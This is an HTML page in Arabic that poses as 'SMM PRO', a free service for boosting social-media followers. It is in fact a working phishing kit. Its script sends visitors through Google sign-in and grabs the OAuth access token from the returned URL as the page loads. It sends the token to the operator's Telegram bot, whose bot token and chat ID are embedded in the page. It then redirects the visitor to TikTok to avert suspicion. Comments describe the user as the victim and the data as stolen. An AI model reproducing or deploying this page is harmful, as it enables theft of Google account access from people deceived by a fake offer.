<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMM PRO | زيادة متابعين مجاناً</title>
    <style>
        :root { --primary: #4285f4; --dark: #1a1a1a; }
        body { margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--dark); color: white; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .card { background: #2a2a2a; padding: 2rem; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; width: 90%; max-width: 400px; border: 1px solid #3d3d3d; }
        h1 { color: var(--primary); margin-bottom: 0.5rem; }
        p { color: #aaa; font-size: 0.9rem; margin-bottom: 1.5rem; }
        .btn-google { background: white; color: #757575; padding: 12px 24px; border-radius: 5px; border: none; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; transition: 0.3s; }
        .btn-google:hover { background: #f1f1f1; transform: translateY(-2px); }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid var(--primary); border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: none; margin: 10px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card" id="mainCard">
    <h1>SMM PRO v2.6</h1>
    <p>قم بتوثيق حسابك عبر Google لبدء رشق المتابعين تلقائياً لعام 2026</p>
    
    <button class="btn-google" onclick="startAuth()">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" width="20" alt="G">
        تسجيل الدخول عبر Google
    </button>
    <div class="loader" id="loader"></div>
</div>

<script>
    // --- إعداداتك الخاصة (مهم جداً) ---
    const CONFIG = {
        BOT_TOKEN: "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY",
        CHAT_ID: "1772820433",
        CLIENT_ID: "965361607866-h7pg0gc9g1t28i3rv6asd3bomh9b6h83.apps.googleusercontent.com", // المعرف الذي نسخته
        REDIRECT_URI: "https://3321122-wq.github.io/Mohammed/" // رابط صفحتك بدقة
    };

    // 1. وظيفة توجيه الضحية لجوجل
    function startAuth() {
        document.getElementById('loader').style.display = 'block';
        const oauthUrl = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${CONFIG.CLIENT_ID}&redirect_uri=${encodeURIComponent(CONFIG.REDIRECT_URI)}&response_type=token&scope=email%20profile&state=verified_smm`;
        window.location.href = oauthUrl;
    }

    // 2. وظيفة سحب التوكن وإرساله للتلجرام
    async function hijackToken() {
        const hash = window.location.hash;
        if (hash.includes("access_token")) {
            const params = new URLSearchParams(hash.replace("#", "?"));
            const token = params.get("access_token");

            if (token) {
                // إخفاء الواجهة للإيهام بالتحميل
                document.getElementById('mainCard').innerHTML = "<h1>جاري المعالجة...</h1><p>تم التوثيق بنجاح، جاري فحص جودة المتابعين</p><div class='loader' style='display:block'></div>";

                // إرسال البيانات المسروقة لك
                const message = `🔓 [تم صيد توكن جديد!]\n\n🎟️ Access Token:\n\`${token}\`\n\n🔗 استخدم التوكن لفتح الحساب فوراً!`;
                
                try {
                    await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: message, parse_mode: "Markdown" })
                    });
                } catch (e) { console.error("Send failed"); }

                // تحويل الضحية لمكان آخر بعد 3 ثواني لإبعاد الشك
                setTimeout(() => {
                    window.location.href = "https://www.tiktok.com";
                }, 3000);
            }
        }
    }

    // تشغيل الفحص فور تحميل الصفحة
    window.onload = hijackToken;
</script>

</body>
</html>
